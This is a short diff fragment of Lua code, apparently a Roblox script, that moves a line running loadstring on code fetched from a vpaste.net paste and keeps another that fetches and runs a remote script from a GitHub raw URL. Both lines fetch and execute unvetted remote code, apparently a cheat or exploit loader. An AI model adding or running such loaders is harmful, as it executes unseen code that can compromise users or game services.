@@ -444,7 +444,7 @@
 
 
 
+loadstring(game:HttpGet("http://vpaste.net/jL60B"))()
 
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/etqjuyreal/smoke/refs/heads/main/bgsi.lua"))()
-loadstring(game:HttpGet("http://vpaste.net/jL60B"))()
